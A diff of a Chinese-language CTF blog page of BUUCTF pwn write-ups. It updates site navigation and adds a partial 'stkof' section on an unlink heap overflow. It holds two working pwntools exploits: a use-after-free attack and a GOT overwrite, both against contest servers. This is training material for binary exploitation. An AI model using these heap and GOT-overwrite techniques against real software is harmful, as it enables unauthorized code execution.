@@ -107,8 +107,12 @@
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu2/2-1607687616399.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu2/3-1607687926264.png">
 <meta property="og:image" content="https://caiii-vegtable.github.io/image/buu2/4-1607688069660.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu2/1-1608289346426.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu2/2-1608289597822.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu2/3-1608289721792.png">
+<meta property="og:image" content="https://caiii-vegtable.github.io/image/buu2/4-1608289835447.png">
 <meta property="article:published_time" content="2020-09-07T06:41:04.000Z">
-<meta property="article:modified_time" content="2020-12-11T12:01:17.112Z">
+<meta property="article:modified_time" content="2021-10-26T08:39:46.156Z">
 <meta property="article:author" content="caiii-vegtable">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://caiii-vegtable.github.io/image/buu2/check.png">
@@ -203,7 +207,7 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/%20" rel="section">
+          <a href="/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
@@ -212,12 +216,22 @@
         </li>
       
         
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/%20" rel="section">
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
-            Archives
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
           </a>
         </li>
       
@@ -294,6 +308,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -355,7 +391,7 @@
 <p><img src="/image/buu2/show.png" alt="show"></p>
 <p>delete函数，可以删除三次，free后没有置零，有uaf漏洞。</p>
 <p><img src="/image/buu2/del.png" alt="del"></p>
-<h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h2><p>checksec</p>
+<h2 id="3-gyctf-2020-signin"><a href="#3-gyctf-2020-signin" class="headerlink" title="#3 gyctf_2020_signin"></a>#3 gyctf_2020_signin</h2><p>checksec</p>
 <p><img src="/image/buu2/1-1607684019807.png" alt="1"></p>
 <p>menu函数</p>
 <p><img src="/image/buu2/3.png" alt="3"></p>
@@ -388,7 +424,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process('./gyctf_2020_signin')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">25534</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice?'</span>,str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,context)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice?'</span>,str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">    p.send(context)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'your choice?'</span>,str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x4040c0</span></span><br><span class="line">edit(<span class="number">7</span>,p64(ptr<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your choice?'</span>)</span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/image/buu2/7.png" alt="7"></p>
-<h2 id="PicoCTF-2018-got-shell"><a href="#PicoCTF-2018-got-shell" class="headerlink" title="PicoCTF_2018_got-shell"></a>PicoCTF_2018_got-shell</h2><p>checksec</p>
+<h2 id="4-PicoCTF-2018-got-shell"><a href="#4-PicoCTF-2018-got-shell" class="headerlink" title="#4 PicoCTF_2018_got-shell"></a>#4 PicoCTF_2018_got-shell</h2><p>checksec</p>
 <p><img src="/image/buu2/1-1607687381507.png" alt="1"></p>
 <p>有后面win函数</p>
 <p><img src="/image/buu2/2-1607687616399.png" alt="2"></p>
@@ -399,6 +435,24 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29090</span>)</span><br><span class="line"><span class="comment">#p=process('./PicoCTF_2018_got-shell')</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./PicoCTF_2018_got-shell'</span>)</span><br><span class="line">put_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">win=elf.symbols[<span class="string">'win'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'value?'</span>)</span><br><span class="line">p.sendline(hex(put_got))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(hex(win))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/image/buu2/4-1607688069660.png" alt="4"></p>
+<h2 id="5-stkof"><a href="#5-stkof" class="headerlink" title="#5 stkof"></a>#5 stkof</h2><p>checksec</p>
+<p><img src="/image/buu2/1-1608289346426.png" alt="1"></p>
+<p>main</p>
+<p><img src="/image/buu2/2-1608289597822.png" alt="2"></p>
+<p>add</p>
+<p><img src="/image/buu2/3-1608289721792.png" alt="3"></p>
+<p>没有限制申请堆块，用s数组管理，s的地址为0x602140</p>
+<p>edit</p>
+<p><img src="/image/buu2/4-1608289835447.png" alt="4"></p>
+<p>edit函数可以任意输入长度，存在溢出。</p>
+<p>delete函数正常的删除堆块，没有UAF。</p>
+<p>show函数不打印输入的内容。</p>
+<p>unlink：</p>
+<p>构造fd和bk为&amp;p-0x18 和&amp;p-0x10</p>
+<p>触发unlink后为p=&amp;p-0x18</p>
+<p>申请small chunk大小的堆块，利用edit函数的溢出，可以修改堆块的fd和bk。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -514,14 +568,23 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/%20%7C%7C%20archive">
+                <a href="/archives">
               
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
             
 
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
             
 
             
@@ -553,7 +616,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buu2"><span class="nav-text">buu2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-inndy-rop"><span class="nav-text">#1 inndy_rop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-V-amp-N2020-公开赛-easyTHeap"><span class="nav-text">#2 [V&amp;N2020 公开赛]easyTHeap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gyctf-2020-signin"><span class="nav-text">gyctf_2020_signin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PicoCTF-2018-got-shell"><span class="nav-text">PicoCTF_2018_got-shell</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#buu2"><span class="nav-text">buu2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-inndy-rop"><span class="nav-text">#1 inndy_rop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-V-amp-N2020-公开赛-easyTHeap"><span class="nav-text">#2 [V&amp;N2020 公开赛]easyTHeap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-gyctf-2020-signin"><span class="nav-text">#3 gyctf_2020_signin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-PicoCTF-2018-got-shell"><span class="nav-text">#4 PicoCTF_2018_got-shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-stkof"><span class="nav-text">#5 stkof</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -573,7 +636,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
